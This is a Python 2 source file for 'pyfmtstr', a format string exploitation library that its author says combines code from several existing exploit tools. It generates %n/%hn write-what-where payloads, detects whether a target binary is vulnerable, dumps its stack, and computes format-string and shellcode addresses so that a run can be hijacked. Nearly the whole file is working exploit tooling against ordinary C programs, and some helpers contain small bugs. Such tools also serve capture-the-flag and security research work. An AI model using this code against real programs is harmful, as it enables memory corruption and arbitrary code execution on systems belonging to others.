#!/usr/bin/env python

"""
pyfmtstr - format string exploitation library
             by cloud

This library shamelessly rips code from a bunch of existing libraries:
    postmodern - Ronin FormatString Helper
    Paul Haas - Defcon 18 Auto Format Brute Forcer
    hellman - libformatstr
    jduck - Metasploit FormatString Mixin

I just reoganized/combined things in a way that I prefer.
"""

import re
import sys
import struct
from binascii import hexlify
from subprocess import Popen, PIPE

class byte:
    def __init__(self, value):
        #accept byte(0x41) or byte("\x41")
        if isinstance(value, str):
            value = struct.unpack("<B", value)[0]
        self.value = value % (1 << 8)

    def __int__(self):
        return self.value

    def __hex__(self):
        return str(hex(self.value))

    def __str__(self):
        return "\\x{0:x}".format(self.value)

class word:
    def __init__(self, value):
        #accept word(0x4141) or word("\x41\x41")
        if isinstance(value, str):
            value = struct.unpack("<H", value)[0]
        self.value = value % (1 << 16)

    def __int__(self):
        return self.value

    def __hex__(self):
        return "0x{0:x}".format(self.value)

    def __str__(self):
        bytes = ["{0:x}".format(self.value)[i:i+2] for i in range(-2,4,2)]
        return "\\x".join(bytes)

class dword:
    def __init__(self, value):
        #accept dword(0x41414141) or word("\x41\x41\x41\x41")
        if isinstance(value, str):
            value = struct.unpack("<I", value)[0]
        self.value = value

    def __int__(self):
        return self.value

    def __hex__(self):
        return "0x{0:x}".format(self.value)

    def __str__(self):
        bytes = ["{0:x}".format(self.value)[i:i+2] for i in range(-2,8,2)]
        return "\\x".join(bytes)

class membuf:
    """
    Python representation of a memory buffer.
    Stolen and adapted from libformatstr.

    Input types supported:
     Address:
       int/long: 0x08049580
       packed:   "\x80\x95\x04\x08"
     Value:
       byte(0xde) or byte("\xde")
       word(0xdead) or word("\xad\xde")
       dword(0xdeadbeef) or dword("\xef\xbe\xad\xde")
       int/long: 0xdeadbeef
       packed: "\xef\xbe\xad\xde\xce\xfa\xad\xde"
       list: [0xdeadbeef, "sc\x00\x00", "test", word(0x1337)]
    """

    def __init__(self):
        self.mem = dict()

        self.parsers = {
            list: self._set_list,
            str: self._set_str,
            int: self._set_dword,
            long: self._set_dword,
            dword: self._set_dword,
            word: self._set_word,
            byte: self._set_byte
        }

    def __setitem__(self, addr, value):
        addr_type = type(addr)
        if addr_type in (int, long):
            addr = addr % (1 << 32)
        elif addr_type == str:
            addr = struct.unpack("<I", addr)[0]
        else:
            raise TypeError("Unknown type of address: " + str(addr_type))

        val_type = type(value)
        if val_type == type(self):  # instance...
            val_type = value.__class__
        if val_type in self.parsers:
            return self.parsers[val_type](addr, value)
        else:
            raise TypeError("Unknown type of value: " + str(val_type))

    def __getitem__(self, addr):
        try:
            return self.mem[addr]
        except KeyError:
            print "Memory address not found in the membuf"

    def _set_list(self, addr, lst):
        for i, value in enumerate(lst):
            addr = self.__setitem__(addr, value)
        return addr

    def _set_str(self, addr, s):
        for i, c in enumerate(s):
            self._set_byte(addr + i, ord(c))
        return addr + len(s)

    def _set_dword(self, addr, value):
        for i in xrange(4):
            self.mem[addr + i] = (int(value) >> (i * 8)) % (1 << 8)
        return addr + 4

    def _set_word(self, addr, value):
        for i in xrange(2):
            self.mem[addr + i] = (int(value) >> (i * 8)) % (1 << 8)
        return addr + 2

    def _set_byte(self, addr, value):
        self.mem[addr] = int(value) % (1 << 8)
        return addr + 1

    def __str__(self):
        bytes = list()
        for addr in sorted(self.mem.iterkeys()):
            bytes.append("\\x{0:02x}".format(self.mem[addr]))
        return ''.join(bytes)

    def __len__(self):
        return len(self.mem)

class pyfmtstr():
    def __init__(self, num_pops=0, pad_bytes=0, printed_bytes=0, membuf=None, pad="G"):
        self.pad       = pad
        self.membuf    = membuf
        self.use_hn    = True
        self.use_dpa   = True 
        self.use_fpu   = False
        self.num_pops  = num_pops
        self.num_pads  = pad_bytes
        self.printed   = printed_bytes
        self.bits      = struct.calcsize("P") * 8 #32 or 64bit machine?

    def gen_pad(self, length):
        return self.pad * length

    def set_caps(self, hn=True, fpu=False, dpa=False):
        self.use_hn  = hn
        self.use_fpu = fpu
        self.use_dpa = dpa

    def print_caps(self):
        """Print currently set capabilities"""

        print "%hn: {0:s}".format(str(self.use_hn))
        print "DPA: {0:s}".format(str(self.use_dpa))
        print "FPU: {0:s}".format(str(self.use_fpu))

    def generate_fmtstr(self):
        if not self.use_hn:
            return self.generate_fmt_four_bytes()
        else:
            return self.generate_fmt_two_shorts()

    def generate_fmt_four_bytes(self):
        if self.use_hn:
            sys.exit("use_hn must be set to False")

        t = self.create_tuples_from_membuf()
        return self.generate_from_tuples(t)

    def generate_fmt_two_shorts(self):
        if not self.use_hn:
            sys.exit("use_hn must be set to True")

        t = self.create_tuples_from_membuf()
        return self.generate_from_tuples(t)

    def check_nullbyte(self, addr):
        if "\x00" in struct.pack("<I", addr):
            # check if preceding address can be used
            if (addr - 1) not in self.membuf.mem or \
                "\x00" in struct.pack("<I", addr - 1):
                # to avoid null bytes in the last byte of address, set prev byte
                warning("Can't avoid null byte at address " + hex(addr))
            else:
                return addr - 1
        return addr

    def create_tuples_from_membuf(self):
        """
        Make tuples like (size, address, value), sorted by address
        Trying to avoid null byte by using preceding address in the case.
        """

        t = []
        addrs = list(sorted(self.membuf.mem.keys())) #addr of each byte to set

        addr_index = 0
        while addr_index < len(addrs):
            addr = addrs[addr_index]
            addr = self.check_nullbyte(addr)

            if self.use_hn:
                dword = 0
                for i in range(4):
                    if addr + i not in self.membuf.mem:
                        dword = -1
                        break
                    dword |= self.membuf.mem[addr + i] << (i * 8)

                if 0 <= dword < (1 << 16):
                    t.append( (4, addr, dword) )
                    if addrs[addr_index + 2] == addr + 3:
                        addr_index += 3  # backstepped
                    elif addrs[addr_index + 3] == addr + 3:
                        addr_index += 4
                    else:
                        raise ValueError("Unknown error. Missing bytes")
                    continue

                word = 0
                for i in range(2):
                    if addr + i not in self.membuf.mem:
                        word = -1
                        break
                    word |= self.membuf.mem[addr + i] << (i * 8)

                if 0 <= word < (1 << 16):
                    t.append( (2, addr, word) )
                    if addrs[addr_index] == addr + 1:
                        addr_index += 1  # backstepped
                    elif addrs[addr_index + 1] == addr + 1:
                        addr_index += 2
                    else:
                        raise ValueError("Unknown error. Missing bytes")
                    continue
            else:
                byte = self.membuf.mem[addr]

                if 0 <= byte < (1 << 16):
                    t.append( (1, addr, byte) )
                    addr_index += 1
                    continue

        return t

    def generate_from_tuples(self, t):
        """Generates a fmtstr from tuples of (size,write_where,write_what)"""

        num_pops = self.num_pops
        num_pads = self.num_pads

        addrs  = str()
        fmtstr = str()
        count = self.count_printed(t)

        for tup in t:
            # find out how much to advance the column value
            if self.use_hn:
                prec = self.target_short(tup[2], count)
            else: #"%n"
                prec = self.target_byte(tup[2], count)

            # for non-dpa, if the prec is more than 8, 
            # we need something to pop
            if not self.use_dpa and prec >=8:
                addrs += self.gen_pad(4)

            # write here!
            addrs += struct.pack("<I", tup[1])

            # put our advancement fmt (or bytes)
            fmtstr += self.advance_printed_count(prec)

            # fmt to cause the write :)
            fmtstr += "%"
            if self.use_dpa:
                fmtstr += "{0:03d}$".format(num_pops)
                num_pops += 1
            if self.use_hn:
                fmtstr += "h"
            fmtstr += "n"

            # update written count
            if self.use_hn:
                count = tup[2]
            else: #"%n"
                count += prec
                
        res = self.gen_pad(num_pads)
        res += addrs
        if not self.use_dpa:
            res += "%8x" * num_pops
        res += fmtstr

        return res 

    def count_printed(self, t):
        """Count how many bytes will print before we reach the writing."""

        count = self.printed + self.num_pads

        if self.use_hn and not self.use_dpa:
            count += (8 * self.num_pops)
        else:
            pass #FIXME: pops for $n?

        npr = count
        for tup in t:
            if self.use_hn:
                prec = self.target_short(tup[2], npr)

                #this gets popped in order to advance the column 
                #(dpa doesn't need these)
                if not self.use_dpa and prec >= 8:
                    count += 4

                npr = tup[2]

            # account for the addr to write to
            # FIXME: for $n?
            count += 4

        return count

    def target_short(self, value, printed):
        """Generate the number to be used for precision that will create
        the specified value to write."""

        if value < printed:
            return (0x10000 - printed) + value

        return value - printed

    def target_byte(self, value, printed):
        """Generate the number to be used for precision that will create
        the specified value to write. Algorithm from scut fmtstr paper."""

        value += 0x100
        printed %= 0x100
        padding = (value - printed) % 0x100
        if (padding < 10):
            padding += 0x100

        return padding

    def advance_printed_count(self, prec):
        """Generate a format string that will advance the printed count
           by the specified precision."""
        if prec == 0:
            return ""

        # asumming %x max normal length is 8...
        if prec >= 8:
            return "%{0:05d}x".format(prec)

        # anything else, we just put some chars in...
        return gen_pad(prec)

class exploit():
    def __init__(self, binary=None, shellcode=None, fmtstr=None, pad="G"):

        self.pad          = pad
        self.fmtstr       = fmtstr
        self.binary       = binary
        self.use_hn       = True
        self.use_dpa      = True 
        self.use_fpu      = False
        self.bits         = struct.calcsize("P") * 8 #32 or 64bit machine?
        self.shellcode    = shellcode
        self.padlen       = 0
        self.maxlen       = -1
        self.sc_align     = -1
        self.sc_offset    = -1
        self.fmtstr_addr  = -1
        self.exploit_addr = -1

    def detect_caps(self):
        """Detect the capabilities (only works for non-blind)"""

        self.use_dpa = self.detect_cap_dpa()
        self.use_fpu = self.detect_cap_fpu()

    def print_caps(self):
        """Print currently set capabilities"""

        print "%hn: {0:s}".format(str(self.use_hn))
        print "DPA: {0:s}".format(str(self.use_dpa))
        print "FPU: {0:s}".format(str(self.use_fpu))

    def set_caps(self, hn=True, fpu=False, dpa=False):
        self.use_hn  = hn
        self.use_fpu = fpu
        self.use_dpa = dpa

    def detect_cap_dpa(self):
        if self.bits == 64:
            fmtstr = "|%1$018p|"
        elif self.bits == 32:
            fmtstr = "|%1$010p|"

        res = self.trigger_fmtstr(fmtstr)
        if not res:
            return False

        res = self.extract_fmtstr_output(res)

        if self.bits == 64:
            r = re.compile("^\|[0-9a-fx]{18}\|$")
        elif self.bits == 32:
            r = re.compile("^\|[0-9a-fx]{10}\|$")
        if r.search(res) != None:
            return True
        return False

    def detect_cap_fpu(self):
        fmtstr = "|%g|"

        res = self.trigger_fmtstr(fmtstr)
        if not res:
            return False

        res = self.extract_fmtstr_output(res)

        r = re.compile("^\|[\-0-9]+\.[e\-0-9]+\|$")
        if r.search(res) != None:
            return True
        return False

    def detect_vulnerable(self):
        """NOTE: This will likely crash the target process"""

        fmtstr = "|{0:s}|".format("%n"*16)
        res = self.trigger_fmtstr(fmtstr)
        if not res:
            return True

        res = self.extract_fmtstr_output(res)

        r = re.compile("^\|\|$")
        if r.search(res) != None:
            return True
        if not res: #segfault
            return True
        return False

    def stack_read(self, offset=1, fmt=None):
        """Read a single format from the stack at offset"""

        # cant read offset 0!
        if offset < 1:
            return None

        if not fmt:
            if self.bits == 64:
                fmt = "lx"
            elif self.bits == 32:
                fmt = "x"

        fmtstr = str()
        if self.use_dpa:
            fmtstr += "%{0:03d}${1:s}".format(offset, fmt)
        else:
            x = offset
            if self.use_fpu and x>=2:
                fmtstr += "%g" * (x/2)
                x %= 2

            fmtstr += ("%" + fmt) * (x - 1)
            fmtstr += "%{0:s}".format(fmt)

        # Pad the rest of the fmtstr to create a consistent maxlen string
        if self.maxlen == -1:
            self.maxlen = len(fmtstr) + len(self.shellcode)

        MAXLEN = 70 #assume max of 32bit $n fmtstr + 24byte x86.linux.binsh
        if self.maxlen < MAXLEN:
            self.maxlen = MAXLEN


        self.padlen = self.maxlen - len(fmtstr)
        fmtstr += self.pad * self.padlen
        self.fmtstr = fmtstr

        res = self.trigger_fmtstr(fmtstr)
        if not res:
            return res

        return self.extract_fmtstr_output(res)

    def dump_stack(self, start_arg=1, stop_arg=999):
        """Dump stack values with %p until fmtstr (hex packed) is found.

           ./self.binary `perl -E 'say "%p"x200'`

           for i in {001..999}; do echo -n "$i: "; ./self.binary "%$i\$p";
           echo; done | grep -v nil

           %=\x25 $=\x24 p=\x70
        """

        self.use_dpa = True

        found = -1
        stack = str()

        for offset in range(start_arg, stop_arg):
            res = self.stack_read(offset=offset, fmt="p")
            if res:
                res = int(res,16)

                if self.bits == 64:
                    stack += struct.pack('<Q',res)
                elif self.bits == 32:
                    stack += struct.pack('<L',res)

                found = stack.find("%%%03i$p" % (offset - 1))

            if found != -1:
                found = offset
                break

        if found != -1:
            self.sc_offset = found / (self.bits / 8) + 1
            self.sc_align  = found % (self.bits / 8)

        return self.sc_offset,self.sc_align

    def find_fmtstr_address(self, start_arg=1, stop_arg=999):
        """Try to guess the argument number of the format string using %s

        for i in {001..999}; do echo -n "$i: "; ./self.binary "%$i\$p:%$i\$s";
        echo; done | grep -v nil | grep -v -P "\d: $"
        """

        self.use_dpa = True

        found = -1
        stack = str()
        for offset in range(start_arg, stop_arg):
            res = self.stack_read(offset=offset, fmt="s")

            if res:
                if ("%%%03i$s" % offset) in res:
                    found = offset
                    res = self.stack_read(offset=offset, fmt="p")
                    break

        if found != -1:
            self.fmtstr_addr  = int(res,16)
            self.exploit_addr = self.fmtstr_addr + self.maxlen \
                                 - len(self.shellcode)

        return self.fmtstr_addr,self.exploit_addr

    def trigger_fmtstr(self, f):
        """Override this method in your code."""

        import os
        exists = os.path.isfile(self.binary) and os.access(self.binary, os.X_OK)
        if not exists:
            sys.exit("Error: cannot execute %s" % self.binary)

        try:
            res = Popen([self.binary,f],stdout=PIPE,stderr=PIPE).communicate()
        except:
            res = None
        return res

    def extract_fmtstr_output(self, output):
        """Override this method in your code."""

        stdout = output[0].strip()
        stderr = output[1].strip()

        # Strip remaining pad from the output: %{offset}${fmt}AAAAAAAAAAAAAAAA
        # Won't work if self.binary contains a char in self.pad or [0-9a-f]
        if stdout.find(self.pad) != -1:
            stdout = stdout[:stdout.find(self.pad)]

        if stdout == "(nil)":
            stdout = None

        return stdout

